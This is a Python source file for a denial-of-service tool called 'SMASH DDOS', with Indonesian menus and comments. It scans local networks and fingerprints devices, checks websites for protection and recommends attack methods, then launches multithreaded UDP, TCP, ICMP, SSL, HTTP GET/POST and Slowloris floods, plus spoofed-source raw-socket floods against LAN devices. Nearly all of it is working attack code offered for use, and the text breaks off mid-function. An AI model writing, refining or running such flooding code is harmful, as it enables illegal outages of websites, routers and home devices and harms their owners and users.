#!/usr/bin/env python3
import socket
import threading
import requests
import random
import time
import sys
import os
import subprocess
import struct
import re
import platform
import concurrent.futures
from datetime import datetime
from urllib.parse import urlparse

# ========== WARNA ANSI ==========
G = "\033[92m"   # Hijau
B = "\033[94m"   # Biru
C = "\033[96m"   # Cyan
M = "\033[95m"   # Magenta
W = "\033[97m"   # Putih
R = "\033[91m"   # Merah
Y = "\033[93m"   # Kuning
N = "\033[0m"    # Reset
U = "\033[96m"   # Light Green / Cyan terang

# ========== CLEAR SCREEN ==========
os.system('clear' if os.name == 'posix' else 'cls')

# ========== BORDER BOX ==========
BOX_TOP = "┌────────────────────────────────────────┐"
BOX_BOT = "└────────────────────────────────────────┘"

def box_header(title):
    total_width = 40
    title_str = f" {title} "
    pad_left = (total_width - len(title_str)) // 2
    pad_right = total_width - len(title_str) - pad_left
    return f"{G}│{N}{' ' * pad_left}{G}{title_str}{N}{' ' * pad_right}{G}│{N}"

# ========== SPASI ==========
s_1 = " "
s_2 = "  "
s_3 = "   "
s_4 = "    "
s_5 = "     "
s_6 = "      "
s_7 = "       "
s_8 = "        "
s_9 = "         "
s_10 = "          "
s_11 = "           "
s_12 = "            "

# ========== FUNGSI WAKTU & DEVICE ==========
def get_waktu():
    """Ambil jam dan tanggal"""
    now = datetime.now()
    # Jam
    jam = now.strftime("%H:%M")
    # Hari
    hari_list = ["Senin", "Selasa", "Rabu", "Kamis", "Jumat", "Sabtu", "Minggu"]
    hari = hari_list[now.weekday()]
    # Tanggal, Bulan, Tahun
    bulan_list = ["Jan", "Feb", "Mar", "Apr", "Mei", "Jun",
                  "Jul", "Agu", "Sep", "Okt", "Nov", "Des"]
    tanggal = now.day
    bulan = bulan_list[now.month - 1]
    tahun = now.year
    return jam, hari, tanggal, bulan, tahun

# ========== BANNER ==========
jam, hari, tgl, bln, thn = get_waktu()

banner = f"""
{G}
{s_1}   ███████╗███╗   ███╗ █████╗ ███████╗██╗  ██╗
{s_1}   ██╔════╝████╗ ████║██╔══██╗██╔════╝██║  ██║
{s_1}   ███████╗██╔████╔██║███████║███████╗███████║
{s_1}   ╚════██║██║╚██╔╝██║██╔══██║╚════██║██╔══██║
{s_1}   ███████║██║ ╚═╝ ██║██║  ██║███████║██║  ██║
{s_1}   ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

{R}{s_7} █ █ █  ▀█▀ █▀█ ▄▀█{R}{s_1} █▀▄ █▀▄ █▀█ █▀
{R}{s_7} █▄█ █▄  █  █▀▄ █▀█{R}{s_1} █▄▀ █▄▀ █▄█ ▄█
{s_12}
{R}{s_3}         SMASH DDOS - BY VSA-CODER{N}

{G}┌────────────────────────────────────────┐{N}
{G}│{N} {C}Jam    : {Y}{jam}{N}                         {G}│{N}
{G}│{N} {C}Hari   : {Y}{hari}, {tgl}/{bln}/{thn}{N}            {G}│{N}
{G}│{N} {C}TikTok : {M}@vsagoldx{N}                     {G}│{N}
{G}└────────────────────────────────────────┘{N}
"""

# ============================================================
# ============== DATABASE OS & VERSI ========================
# ============================================================

WINDOWS_VERSIONS = [
    "Windows 1.0", "Windows 2.0", "Windows 2.1x", "Windows 3.0",
    "Windows 3.1x", "Windows 95", "Windows 98", "Windows Me",
    "Windows NT 3.1", "Windows NT 3.5", "Windows NT 3.51",
    "Windows NT 4.0", "Windows 2000", "Windows XP",
    "Windows Server 2003", "Windows Vista", "Windows Server 2008",
    "Windows 7", "Windows Server 2008 R2", "Windows 8",
    "Windows 8.1", "Windows Server 2012", "Windows Server 2012 R2",
    "Windows 10", "Windows Server 2016", "Windows Server 2019",
    "Windows 11", "Windows Server 2022", "Windows Server 2025",
    "Windows 365"
]

ANDROID_VERSIONS = [
    "Android 1.0", "Android 1.1", "Android 1.5 Cupcake",
    "Android 1.6 Donut", "Android 2.0 Eclair", "Android 2.1 Eclair",
    "Android 2.2 Froyo", "Android 2.3 Gingerbread",
    "Android 3.0 Honeycomb", "Android 3.1 Honeycomb",
    "Android 3.2 Honeycomb", "Android 4.0 Ice Cream Sandwich",
    "Android 4.1 Jelly Bean", "Android 4.2 Jelly Bean",
    "Android 4.3 Jelly Bean", "Android 4.4 KitKat",
    "Android 5.0 Lollipop", "Android 5.1 Lollipop",
    "Android 6.0 Marshmallow", "Android 7.0 Nougat",
    "Android 7.1 Nougat", "Android 8.0 Oreo", "Android 8.1 Oreo",
    "Android 9 Pie", "Android 10", "Android 11", "Android 12",
    "Android 12L", "Android 13", "Android 14", "Android 15",
    "Android 16"
]

IOS_VERSIONS = [
    "iPhone OS 1", "iPhone OS 2", "iPhone OS 3", "iOS 4", "iOS 5",
    "iOS 6", "iOS 7", "iOS 8", "iOS 9", "iOS 10", "iOS 11", "iOS 12",
    "iOS 13", "iOS 14", "iOS 15", "iOS 16", "iOS 17", "iOS 18", "iOS 19"
]

LINUX_DISTROS = [
    "Ubuntu", "Linux Mint", "Debian", "Fedora", "Arch Linux",
    "Red Hat Enterprise Linux", "CentOS", "openSUSE", "Kali Linux",
    "Manjaro", "Zorin OS", "Elementary OS", "Pop!_OS", "AlmaLinux",
    "Rocky Linux", "Alpine Linux", "Slackware", "Gentoo",
    "Puppy Linux", "MX Linux", "EndeavourOS", "Void Linux", "NixOS",
    "Tails", "Deepin", "Garuda Linux", "Mageia", "Solus",
    "Parrot OS", "BlackArch", "ArcoLinux", "PCLinuxOS", "Qubes OS",
    "Clear Linux", "Oracle Linux", "Devuan", "Trisquel", "PureOS",
    "Endless OS", "SteamOS", "ChromeOS", "LineageOS",
    "OpenWrt", "DD-WRT", "TrueNAS", "Proxmox VE", "Raspberry Pi OS",
    "LibreELEC", "CoreELEC", "Kodi", "Alpine", "RHEL", "SUSE",
]

# ============================================================
# ============== AUTO DETECT OS + VERSI =====================
# ============================================================

def detect_os_version(ip, gateway=None):
    if gateway and ip == gateway:
        return "WiFi"
    if ip.endswith(".1"):
        return "WiFi"
    
    detected = {
        "is_windows": False, "is_android": False, "is_ios": False,
        "is_linux": False, "is_router": False, "is_tv": False,
        "is_web": False, "is_printer": False, "is_camera": False,
        "is_nas": False, "version": None, "hostname": None,
    }
    
    try:
        socket.setdefaulttimeout(1)
        hostname = socket.gethostbyaddr(ip)[0].lower()
        detected["hostname"] = hostname
    except:
        hostname = ""
    
    open_ports = []
    for port in [21, 22, 23, 53, 80, 135, 139, 443, 445, 554,
                 548, 631, 3389, 3689, 5037, 5353, 5555, 5900,
                 62078, 7000, 7100, 8001, 8002, 8008, 8009,
                 8080, 8443, 9100, 55000, 5000, 5001, 515]:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.15)
            if s.connect_ex((ip, port)) == 0:
                open_ports.append(port)
            s.close()
        except:
            pass
    
    if 135 in open_ports or 139 in open_ports or 445 in open_ports or 3389 in open_ports:
        detected["is_windows"] = True
        if hostname:
            for v in WINDOWS_VERSIONS:
                if v.lower().replace(" ", "") in hostname.replace("-", "").replace("_", ""):
                    detected["version"] = v
                    break
    
    if 5555 in open_ports or 5037 in open_ports:
        detected["is_android"] = True
    if hostname and ("android" in hostname or "phone" in hostname or "mobile" in hostname):
        detected["is_android"] = True
    
    if 62078 in open_ports:
        detected["is_ios"] = True
    if hostname and ("iphone" in hostname or "ipad" in hostname or "ios" in hostname):
        detected["is_ios"] = True
    
    if 22 in open_ports or 21 in open_ports or 23 in open_ports:
        if not detected["is_windows"]:
            detected["is_linux"] = True
    if hostname:
        for distro in LINUX_DISTROS:
            if distro.lower().replace(" ", "") in hostname.replace("-", "").replace("_", ""):
                detected["is_linux"] = True
                detected["version"] = distro
                break
    
    if 80 in open_ports and 443 in open_ports and 22 in open_ports:
        if hostname and ("router" in hostname or "gateway" in hostname or "modem" in hostname):
            detected["is_router"] = True
    
    if 8008 in open_ports or 8009 in open_ports or 55000 in open_ports:
        detected["is_tv"] = True
    if hostname and ("tv" in hostname or "smarttv" in hostname or "bravia" in hostname):
        detected["is_tv"] = True
    
    if 9100 in open_ports or 631 in open_ports or 515 in open_ports:
        detected["is_printer"] = True
    
    if 5000 in open_ports or 5001 in open_ports:
        detected["is_nas"] = True
    
    if 554 in open_ports:
        detected["is_camera"] = True
    
    if 80 in open_ports or 443 in open_ports or 8080 in open_ports:
        detected["is_web"] = True
    
    if detected["is_windows"]:
        return detected["version"] if detected["version"] else "Windows"
    if detected["is_android"]:
        return "Android"
    if detected["is_ios"]:
        return "iOS"
    if detected["is_linux"]:
        return detected["version"] if detected["version"] else "Linux"
    if detected["is_router"]:
        return "Router"
    if detected["is_tv"]:
        return "Smart TV"
    if detected["is_printer"]:
        return "Printer"
    if detected["is_nas"]:
        return "NAS"
    if detected["is_camera"]:
        return "IP Camera"
    if detected["is_web"]:
        return "Web Server"
    return "Unknown"

def get_hostname(ip, gateway):
    if ip == gateway:
        return "Gateway"
    try:
        socket.setdefaulttimeout(1)
        hostname = socket.gethostbyaddr(ip)[0]
        if hostname and hostname != ip:
            if "." in hostname:
                hostname = hostname.split(".")[0]
            return hostname[:14]
    except:
        pass
    return "Unknown"

def ping_host(ip, timeout=1):
    try:
        result = subprocess.run(
            ["ping", "-c", "1", "-W", str(timeout), ip],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            timeout=timeout + 1
        )
        return result.returncode == 0
    except:
        return False

def check_host(i, prefix, gateway):
    host = f"{prefix}.{i}"
    result = {"ip": host, "alive": False, "hostname": "", "type": ""}
    if ping_host(host, timeout=1):
        result["alive"] = True
        result["hostname"] = get_hostname(host, gateway)
        if host == gateway:
            result["type"] = "WiFi"
        else:
            result["type"] = detect_os_version(host, gateway)
    else:
        for port in [80, 443, 22, 445, 3389, 8080, 23, 21, 62078, 9100, 5555]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                if s.connect_ex((host, port)) == 0:
                    result["alive"] = True
                    result["hostname"] = get_hostname(host, gateway)
                    if host == gateway:
                        result["type"] = "WiFi"
                    else:
                        result["type"] = detect_os_version(host, gateway)
                    s.close()
                    break
                s.close()
            except:
                pass
    return result

def scan_jaringan(gateway):
    print(f"{C}[*] Scan jaringan lokal...{N}")
    print(f"{C}[*] Gateway: {G}{gateway}{N}")
    print(f"{C}[*] Mencari device...{N}\n")

    prefix = ".".join(gateway.split(".")[:3])
    hosts = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(check_host, i, prefix, gateway): i for i in range(1, 255)}
        for future in concurrent.futures.as_completed(futures):
            try:
                r = future.result()
                if r["alive"]:
                    hosts.append({"ip": r["ip"], "hostname": r["hostname"], "type": r["type"]})
            except:
                pass

    hosts.sort(key=lambda x: int(x["ip"].split(".")[-1]))
    return hosts

# ============================================================
# ============== FUNGSI CEK WEB =============================
# ============================================================

def cek_web():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(banner)

    print(f"{G}{BOX_TOP}{N}")
    print(box_header('CEK WEB'))
    print(f"{G}{BOX_BOT}{N}\n")

    target = input(f"{C}Masukkan URL target: {N}").strip()
    if not target.startswith("http"):
        target = "https://" + target

    parsed = urlparse(target)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)

    print(f"\n{C}[*] Menganalisis target...{N}\n")

    try:
        ip = socket.gethostbyname(host)
    except:
        print(f"{R}[!] Gagal resolve domain.{N}")
        input(f"\n{C}Tekan Enter untuk kembali...{N}")
        return

    print(f"{B}[+] Target : {B}{target}{N}")
    print(f"{C}[+] IP     : {C}{ip}:{port}{N}\n")

    try:
        r = requests.get(target, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
        print(f"{G}[+] HTTP Status  : {C}{r.status_code}{N}")
        print(f"{G}[+] Server       : {C}{r.headers.get('Server', 'Unknown')}{N}")
    except Exception as e:
        print(f"{R}[!] HTTP Error: {e}{N}")

    print()
    print(f"{G}{BOX_TOP}{N}")
    print(box_header('CEK PROTEKSI'))
    print(f"{G}{BOX_BOT}{N}")

    proteksi = "unknown"
    try:
        r = requests.get(target, timeout=5, headers={"User-Agent": "Mozilla/5.0"})
        server = r.headers.get("Server", "").lower()
        cf_ray = r.headers.get("CF-RAY", None)

        if "cloudflare" in server or cf_ray:
            print(f"{R}[!] Cloudflare TERDETEKSI{N}")
            print(f"{C}    -> Rekomendasi: HTTP Flood{N}")
            proteksi = "cloudflare"
        elif "vercel" in server:
            print(f"{R}[!] Vercel TERDETEKSI{N}")
            print(f"{C}    -> Serverless, GAK BISA DI-DDOS{N}")
            proteksi = "vercel"
        elif "nginx" in server:
            print(f"{C}[!] Nginx TERDETEKSI{N}")
            print(f"{C}    -> Bisa di-DDOS pake UDP Flood{N}")
            proteksi = "nginx"
        elif "apache" in server:
            print(f"{C}[!] Apache TERDETEKSI{N}")
            print(f"{C}    -> Bisa di-DDOS pake HTTP Flood{N}")
            proteksi = "apache"
        else:
            print(f"{G}[+] Server: {C}{server if server else 'Unknown'}{N}")
    except:
        print(f"{R}[!] Gagal cek proteksi{N}")

    print()
    print(f"{G}{BOX_TOP}{N}")
    print(box_header('CEK PORT UDP'))
    print(f"{G}{BOX_BOT}{N}")

    udp_ports = [53, 123, 11211, 161, 389, 1900]
    port_names = {53: "DNS", 123: "NTP", 11211: "Memcached", 161: "SNMP", 389: "LDAP", 1900: "SSDP"}

    for p in udp_ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(2)
            if p == 53:
                s.sendto(b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01", (ip, p))
            elif p == 123:
                s.sendto(b"\x17\x00\x03\x2a" + b"\x00" * 4, (ip, p))
            elif p == 11211:
                s.sendto(b"\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n", (ip, p))
            elif p == 161:
                s.sendto(b"\x30\x26\x02\x01\x00\x04\x06\x70\x75\x62\x6c\x69\x63", (ip, p))
            elif p == 389:
                s.sendto(b"\x30\x0c\x02\x01\x01\x63\x07\x0a\x01\x00\x04\x00\x04\x00", (ip, p))
            elif p == 1900:
                s.sendto(b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n\r\n", (ip, p))

            try:
                data, _ = s.recvfrom(65535)
                print(f"{C}[+] Port {p} ({port_names[p]}) AKTIF{N}")
            except:
                print(f"{C}[x] Port {p} ({port_names[p]}) TUTUP{N}")
            s.close()
        except:
            pass

    print()
    print(f"{G}{BOX_TOP}{N}")
    print(box_header('REKOMENDASI'))
    print(f"{G}{BOX_BOT}{N}")

    if proteksi == "cloudflare":
        print(f"{C}[1] HTTP Flood          -> L7{N}")
        print(f"{C}[2] Slowloris           -> L7{N}")
    elif proteksi == "vercel":
        print(f"{R}[!] Vercel GAK BISA DI-DDOS{N}")
    elif proteksi == "nginx":
        print(f"{C}[1] UDP Flood Ultimate  -> L4{N}")
        print(f"{C}[2] DNS Amplification   -> L5{N}")
    elif proteksi == "apache":
        print(f"{C}[1] HTTP Flood          -> L7{N}")
        print(f"{C}[2] Slowloris           -> L7{N}")
    else:
        print(f"{C}[1] UDP Flood Ultimate  -> L4{N}")
        print(f"{C}[2] DNS Amplification   -> L5{N}")
        print(f"{C}[3] HTTP Flood          -> L7{N}")

    input(f"\n{C}Tekan Enter untuk kembali...{N}")

# ============================================================
# ============== FUNGSI DDOS WEB ============================
# ============================================================

def ddos_web():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(banner)

    print(f"{G}{BOX_TOP}{N}")
    print(box_header('KONFIGURASI SERANGAN'))
    print(f"{G}{BOX_BOT}{N}\n")

    print(f"{C}[1] Target URL{N}")
    TARGET_URL = input(f"{C}    -> {N}").strip()

    print(f"\n{C}[2] Thread (800-1200){N}")
    THREAD_COUNT = int(input(f"{C}    -> {N}") or 1000)

    print(f"\n{C}[3] Waktu (0 = infinite){N}")
    DURATION = int(input(f"{C}    -> {N}") or 0)

    print(f"\n{G}{BOX_TOP}{N}")
    print(box_header('PILIH METHOD'))
    print(f"{G}{BOX_BOT}{N}")
    print(f"{C}[1]{N} {C}UDP Flood Ultimate{N}    {G}<- TERKUAT{N}")
    print(f"{C}[2]{N} {C}DNS Amplification{N}     {G}<- Amplifikasi{N}")
    print(f"{C}[3]{N} {C}ICMP Flood{N}            {G}<- Butuh root{N}")
    print(f"{C}[4]{N} {C}TCP SYN Flood{N}         {G}<- Klasik ganas{N}")
    print(f"{C}[5]{N} {C}SSL Renegotiation{N}     {G}<- Makan CPU{N}")
    print(f"{C}[6]{N} {C}HTTP Flood{N}            {G}<- Ampuh buat web{N}")
    print(f"{C}[7]{N} {C}HTTP POST Flood{N}       {G}<- Form/API{N}")
    print(f"{C}[8]{N} {C}Slowloris{N}             {G}<- Makan koneksi{N}")
    print(f"{C}[0]{N} {C}ALL METHODS{N}           {G}<- Acak semua{N}")

    method_choice = input(f"\n{B}Pilih method (0-8): {N}").strip()

    parsed = urlparse(TARGET_URL)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    path = parsed.path or "/"

    try:
        ip = socket.gethostbyname(host)
    except:
        ip = host

    print(f"\n{G}{BOX_TOP}{N}")
    print(box_header('KONFIGURASI FINAL'))
    print(f"{G}{BOX_BOT}{N}")
    print(f"{G}  Target  : {B}{TARGET_URL}{N}")
    print(f"{G}  IP      : {C}{ip}:{port}{N}")
    print(f"{G}  Thread  : {R}{THREAD_COUNT}{N}")
    print(f"{G}  Waktu   : {M}{'Unlimited' if DURATION == 0 else f'{DURATION} detik'}{N}")
    print(f"{G}  Method  : {Y}{method_choice}{N}\n")

    stop_attack = False

    def udp_flood_ultimate():
        nonlocal stop_attack
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 16)
        except:
            pass
        payload = random._urandom(65500)
        while not stop_attack:
            try:
                for _ in range(200):
                    s.sendto(payload, (ip, port))
            except:
                pass

    def dns_amp():
        nonlocal stop_attack
        dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222"]
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        query = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01"
        while not stop_attack:
            try:
                for _ in range(50):
                    dns = random.choice(dns_servers)
                    s.sendto(query, (dns, 53))
                    s.sendto(query, (ip, 53))
            except:
                pass

    def icmp_flood():
        nonlocal stop_attack
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            while not stop_attack:
                packet = b"\x08\x00" + b"\x00\x00" + b"\x00\x00" + b"\x00\x00" + random._urandom(56)
                s.sendto(packet, (ip, 0))
        except:
            pass

    def tcp_flood():
        nonlocal stop_attack
        while not stop_attack:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                s.connect((ip, port))
                s.send(b"GET " + path.encode() + b" HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
                s.close()
            except:
                pass

    def ssl_flood():
        nonlocal stop_attack
        try:
            import ssl
            context = ssl.create_default_context()
            while not stop_attack:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((ip, port))
                    ssl_sock = context.wrap_socket(sock, server_hostname=host)
                    ssl_sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
                    ssl_sock.close()
                except:
                    pass
        except:
            pass

    def http_flood():
        nonlocal stop_attack
        session = requests.Session()
        while not stop_attack:
            try:
                headers = {
                    "User-Agent": random.choice([
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
                        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36",
                    ]),
                    "Accept": "*/*",
                    "Connection": "keep-alive",
                    "Referer": "https://google.com",
                }
                rand_param = random.randint(1, 999999)
                session.get(f"{TARGET_URL}?id={rand_param}", headers=headers, timeout=2)
            except:
                pass

    def http_post_flood():
        nonlocal stop_attack
        headers = {"User-Agent": "Mozilla/5.0"}
        while not stop_attack:
            try:
                data = {"random": random.randint(1, 999999), "data": random._urandom(100).hex()}
                requests.post(TARGET_URL, data=data, headers=headers, timeout=2)
            except:
                pass

    def slowloris():
        nonlocal stop_attack
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((ip, port))
            s.send(b"GET / HTTP/1.1\r\n")
            s.send(b"Host: " + host.encode() + b"\r\n")
            s.send(b"User-Agent: Mozilla/5.0\r\n")
            while not stop_attack:
                s.send(b"X-Header: " + str(random.randint(1, 9999)).encode() + b"\r\n")
                time.sleep(random.uniform(0.5, 3))
        except:
            pass

    all_methods = {
        "1": udp_flood_ultimate, "2": dns_amp, "3": icmp_flood,
        "4": tcp_flood, "5": ssl_flood, "6": http_flood,
        "7": http_post_flood, "8": slowloris,
    }

    if method_choice == "0":
        selected_methods = list(all_methods.values())
    else:
        selected_methods = [all_methods[method_choice]] if method_choice in all_methods else [udp_flood_ultimate]

    if os.geteuid() != 0:
        if method_choice == "3" or method_choice == "0":
            filtered = [m for m in selected_methods if m != icmp_flood]
            if filtered:
                selected_methods = filtered
            else:
                selected_methods = [udp_flood_ultimate]

    threads = []
    for i in range(THREAD_COUNT):
        attack_func = random.choice(selected_methods)
        t = threading.Thread(target=attack_func)
        t.daemon = True
        t.start()
        threads.append(t)

    print(f"{G}{BOX_TOP}{N}")
    print(box_header('SERANGAN DIMULAI!'))
    print(f"{G}{BOX_BOT}{N}")
    print(f"{C}  Tekan {R}CTRL + C{C} untuk stop.{N}\n")

    if DURATION > 0:
        try:
            time.sleep(DURATION)
            stop_attack = True
            print(f"\n{C}[!] Serangan selesai setelah {DURATION} detik.{N}")
            input(f"\n{C}Tekan Enter untuk kembali...{N}")
            return
        except KeyboardInterrupt:
            stop_attack = True
            print(f"\n{R}[!] CTRL+C diterima.{N}")
            print(f"{G}[OK] Serangan dihentikan.{N}")
            input(f"\n{C}Tekan Enter untuk kembali...{N}")
            return

    try:
        while not stop_attack:
            time.sleep(5)
            print(f"{C}[+] Thread aktif: {R}{threading.active_count()}{C} | Target: {B}{host}{N}")
    except KeyboardInterrupt:
        stop_attack = True
        print(f"\n{R}[!] CTRL+C diterima.{N}")
        print(f"{G}[OK] Serangan dihentikan.{N}")
        input(f"\n{C}Tekan Enter untuk kembali...{N}")

# ============================================================
# ============== FUNGSI DDOS WIFI ===========================
# ============================================================

def ddos_wifi():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(banner)

    print(f"{G}{BOX_TOP}{N}")
    print(box_header('SCAN JARINGAN'))
    print(f"{G}{BOX_BOT}{N}\n")

    GATEWAY = input(f"{G}Masukkan IP Gateway: {N}").strip()
    
    if not GATEWAY:
        print(f"{R}[!] IP Gateway tidak boleh kosong!{N}")
        input(f"\n{C}Tekan Enter untuk kembali...{N}")
        return

    hosts = scan_jaringan(GATEWAY)
    if not hosts:
        print(f"\n{R}[!] Gak ada device aktif.{N}")
        print(f"{C}[!] Kemungkinan: Client Isolation aktif{N}")
        input(f"\n{C}Tekan Enter untuk kembali...{N}")
        return

    print(f"\n{G}{BOX_TOP}{N}")
    print(box_header(f'DITEMUKAN {len(hosts)} DEVICE AKTIF'))
    print(f"{G}{BOX_BOT}{N}\n")

    print(f"{G}┌──────┬────────────────┬─────────────────────┐{N}")
    print(f"{G}│{N} {G}No   {G}│ {G}IP Address     {G}│ {G}Device              {G}│{N}")
    print(f"{G}├──────┼────────────────┼─────────────────────┤{N}")
    for i, h in enumerate(hosts, 1):
        hostname = h['hostname'][:12] if len(h['hostname']) > 12 else h['hostname']
        dev_type = h['type'][:18] if len(h['type']) > 18 else h['type']
        no_str = f"{i:<4}"
        ip_str = f"{h['ip']:<14}"
        dev_str = f"{hostname} ({dev_type})"
        dev_str = f"{dev_str:<19}"
        
        if h['type'] == "Unknown":
            dev_color = R
        else:
            dev_color = G
        
        print(f"{G}│ {G}{no_str}{G} │ {G}{ip_str}{G} │ {dev_color}{dev_str}{G} │{N}")
    print(f"{G}└──────┴────────────────┴─────────────────────┘{N}\n")

    try:
        pilih = int(input(f"{B}Pilih nomor device (1-{len(hosts)}): {N}")) - 1
        if pilih < 0 or pilih >= len(hosts):
            print(f"{R}[!] Nomor tidak valid!{N}")
            input(f"\n{C}Tekan Enter...{N}")
            return
    except:
        print(f"{R}[!] Input harus angka!{N}")
        input(f"\n{C}Tekan Enter...{N}")
        return

    ip = hosts[pilih]["ip"]
    print(f"\n{C}[+] Target Dipilih:{N}")
    print(f"{G}    IP       : {G}{ip}{N}")
    print(f"{C}    Hostname : {C}{hosts[pilih]['hostname']}{N}")
    print(f"{C}    Type     : {C}{hosts[pilih]['type']}{N}")

    print(f"\n{G}{BOX_TOP}{N}")
    print(box_header('KONFIGURASI SERANGAN'))
    print(f"{G}{BOX_BOT}{N}\n")

    print(f"{C}[1] Thread (200-800){N}")
    THREAD_COUNT = int(input(f"{C}    -> {N}") or 500)

    print(f"\n{C}[2] Waktu (0 = infinite){N}")
    DURATION = int(input(f"{C}    -> {N}") or 0)

    print(f"\n{G}{BOX_TOP}{N}")
    print(box_header('PILIH METHOD'))
    print(f"{G}{BOX_BOT}{N}")
    print(f"{C}[1]{N}  {C}UDP Flood Ultimate{N}   {G}<- TERKUAT{N}")
    print(f"{C}[2]{N}  {C}UDP Fragment Flood{N}   {G}<- Paket pecah{N}")
    print(f"{C}[3]{N}  {C}UDP Port Rotation{N}    {G}<- Multi-port{N}")
    print(f"{C}[4]{N}  {C}Raw Socket Flood{N}     {G}<- Butuh root{N}")
    print(f"{C}[5]{N}  {C}TCP SYN Flood{N}        {G}<- Klasik ganas{N}")
    print(f"{C}[6]{N}  {C}TCP ACK Flood{N}        {G}<- ACK palsu{N}")
    print(f"{C}[7]{N}  {C}TCP FIN Flood{N}        {G}<- Koneksi reset{N}")
    print(f"{C}[8]{N}  {C}TCP RST Flood{N}        {G}<- Reset koneksi{N}")
    print(f"{C}[9]{N}  {C}ICMP Flood{N}           {G}<- Butuh root{N}")
    print(f"{C}[10]{N} {C}ICMP Smurf{N}           {G}<- Broadcast ping{N}")
    print(f"{C}[11]{N} {C}IP Spoof UDP{N}         {G}<- Spoofed IP{N}")
    print(f"{C}[12]{N} {C}Broadcast Flood{N}      {G}<- Kirim ke .255{N}")
    print(f"{C}[13]{N} {C}Multicast Flood{N}      {G}<- Kirim ke multicast{N}")
    print(f"{C}[0]{N}  {C}ALL METHODS{N}          {G}<- Acak semua{N}")

    method_choice = input(f"\n{B}Pilih method (0-13): {N}").strip()

    print(f"\n{G}{BOX_TOP}{N}")
    print(box_header('KONFIGURASI FINAL'))
    print(f"{G}{BOX_BOT}{N}")
    print(f"{G}  Target  : {B}{ip}{N}")
    print(f"{G}  Thread  : {R}{THREAD_COUNT}{N}")
    print(f"{G}  Waktu   : {M}{'Unlimited' if DURATION == 0 else f'{DURATION} detik'}{N}")
    print(f"{G}  Method  : {Y}{method_choice}{N}\n")

    stop_attack = False

    def udp_flood_ultimate():
        nonlocal stop_attack
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 16)
        except:
            pass
        payload = random._urandom(65500)
        while not stop_attack:
            try:
                for _ in range(200):
                    s.sendto(payload, (ip, random.randint(1, 65535)))
            except:
                pass

    def udp_fragment_flood():
        nonlocal stop_attack
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 16)
        except:
            pass
        while not stop_attack:
            try:
                for _ in range(500):
                    payload = random._urandom(random.randint(1, 500))
                    s.sendto(payload, (ip, random.randint(1, 65535)))
            except:
                pass

    def udp_port_rotation():
        nonlocal stop_attack
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 8)
        except:
            pass
        payload = random._urandom(65500)
        ports = [53, 67, 68, 80, 123, 161, 443, 500, 1900, 4500, 5353]
        while not stop_attack:
            try:
                for p in ports:
                    s.sendto(payload, (ip, p))
            except:
                pass

    def raw_socket_flood():
        nonlocal stop_attack
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            while not stop_attack:
                try:
                    src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    ip_header = struct.pack("!BBHHHBBH4s4s",
                        0x45, 0, 20 + 100, random.randint(0, 65535), 0, 64, 17, 0,
                        socket.inet_aton(src_ip), socket.inet_aton(ip))
                    payload = random._urandom(100)
                    s.sendto(ip_header + payload, (ip, 0))
                except:
                    pass
        except:
            pass

    def tcp_syn_flood():
        nonlocal stop_attack
        while not stop_attack:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.1)
                s.connect((ip, random.randint(1, 65535)))
                s.close()
            except:
                pass

    def tcp_ack_flood():
        nonlocal stop_attack
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            while not stop_attack:
                try:
